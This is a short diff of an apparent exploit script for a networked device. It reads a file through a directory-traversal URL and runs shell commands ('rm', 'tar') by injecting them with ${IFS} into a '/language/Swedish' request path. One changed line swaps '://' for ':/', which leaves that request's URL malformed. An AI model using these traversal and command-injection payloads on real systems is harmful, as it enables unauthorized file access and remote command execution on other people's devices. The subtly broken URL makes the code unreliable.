@@ -51,11 +51,11 @@ def main():
                          % (target_url.scheme, target_url.netloc))
 
             # Read the file.
-            response = raw_url_request('%s://%s/../../../../../../../mnt/mtd/test' % (target_url.scheme, target_url.netloc))
+            response = raw_url_request('%s:/%s/../../../../../../../mnt/mtd/test' % (target_url.scheme, target_url.netloc))
 
 
             # remove it..
-            raw_url_request('%s://%s//language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js'
+            raw_url_request('%s://%s/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js'
                          % (target_url.scheme, target_url.netloc))
 
         except (ConnectionError, Timeout, timeout) as e:
